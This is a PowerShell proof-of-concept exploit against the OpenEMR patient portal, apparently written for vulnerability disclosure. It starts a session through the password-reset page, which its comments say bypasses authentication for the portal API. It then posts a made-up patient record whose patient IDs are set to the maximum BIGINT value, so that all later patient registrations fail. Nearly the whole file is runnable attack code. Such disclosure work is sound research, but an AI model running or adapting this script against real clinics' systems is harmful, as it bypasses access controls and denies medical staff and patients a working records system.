#################################################################################################################
#  Author: Chris Patterson                                                                                      #
#  Date: 2022-01-01                                                                                             #
#  Purpose: Identify vulnerability in OpenEMR patient portal where self registration allows specific            #
#           patient id to be defined in creation.  This allows an attacker to input the max BIGINT value of     #
#           18446744073709551615, leaving no available ID's for new registrations, and causing an error for     #
#           any staff or self-registrations that follow.                                                        #
#  CVE ID:                                                                                                      #
#                                                                                                               #
#################################################################################################################

$StartTime = Get-Date
$requestCount = 0

#Set proxy if needed (Fiddler users http://localhost:8888)
$proxy = $null #"http://localhost:8888"

#Get the server fqdn
if (!$fqdn) {
    $fqdn = Read-Host -Prompt "Enter the fqdn of the OpenEMR Instance (https://demo.openemr.io/openemr)"
}

#Start a session by requesting a password reset without logging in
#This activates the error handling logic in index.php which sets $_SESSION['register']=true
#when register session variable is true, authentication is bypassed for the patient portal API
$null = Invoke-WebRequest -URI "$fqdn/portal/index.php?requestNew=true" -SessionVariable 'session' -Proxy $proxy
$requestCount++
#Alternatively, if the self registration function is enabled, we can start that session to achieve
#the same result of a register session variable set to true.
#$null = Invoke-WebRequest -URI "$fqdn/portal/account/register.php" -SessionVariable 'session'
if (!$session) {
    Write-Host "A session could not be established.  Check the connection settings."
    exit
}

#Create random data for inserted patient
$first = -join ((65..90)+(97..122)|Get-Random -Count ((5..15)|Get-Random) | ForEach-Object {[char]$_})
$last = -join ((65..90)+(97..122)|Get-Random -Count ((5..15)|Get-Random) | ForEach-Object {[char]$_})
$email = "$($first[0])$($last)@$(-join ((65..90)+(97..122)|Get-Random -Count ((5..15)|Get-Random) | ForEach-Object {[char]$_})).$(("com","net","co","biz")|Get-Random)"

#Specify the maximum BIGINT size for the patient ID
$id = 18446744073709551615

$body = @{
    "note"=$null
    "id"=$id
    "title"=""
    "language"=""
    "financial"=$null  
    "fname"= $first
    "lname"= $last
    "mname"="" 
    "dob"= (Get-Date).AddDays(((-10000..-36500) | Get-Random)).ToString("yyyy-MM-dd")
    "street"="test" 
    "postalCode"="" 
    "city"="test" 
    "state"="" 
    "countryCode"="" 
    "driversLicense"=$null  
    "ss"="" 
    "occupation"=$null  
    "phoneHome"="" 
    "phoneBiz"="" 
    "phoneContact"="" 
    "phoneCell"="" 
    "pharmacyId"=0 
    "status"="" 
    "contactRelationship"="" 
    "date"="$((Get-Date).AddDays(((-10000..-36500) | Get-Random)).ToString("yyyy-MM-dd")) 00:00:00" 
    "sex"="Male" 
    "referrer"=$null  
    "referrerid"=$null  
    "providerid"="1" 
    "refProviderid"=0 
    "email"= $email 
    "emailDirect"= $email
    "ethnoracial"=$null  
    "race"="" 
    "ethnicity"="" 
    "religion"="" 
    "familySize"="" 
    "pubpid"=$id
    "pid"=$id
    "hipaaMail"="" 
    "hipaaVoice"="" 
    "hipaaNotice"="" 
    "hipaaMessage"="" 
    "hipaaAllowsms"="" 
    "hipaaAllowemail"="YES" 
    "regdate"= "$((Get-Date).AddDays(((-10000..-36500) | Get-Random)).ToString("yyyy-MM-dd")) 00:00:00" 
    "mothersname"="" 
    "guardiansname"="" 
    "allowImmRegUse"="" 
    "allowImmInfoShare"=""
    "allowHealthInfoEx"="" 
    "allowPatientPortal"="YES" 
    "careTeam"=0 
    "county"=""
}

$bodyJson = $body | ConvertTo-Json -Depth 1 -Compress

$response = Invoke-WebRequest -URI "$fqdn/portal/patient/api/patient" -WebSession $session -Body $bodyJson -Method Post -Proxy $proxy
$requestCount++
$response.Content

Write-Host ""
Write-Host "Time Elapsed $(((Get-Date)-$startTime)), $requestCount requests were made."
Write-Host ""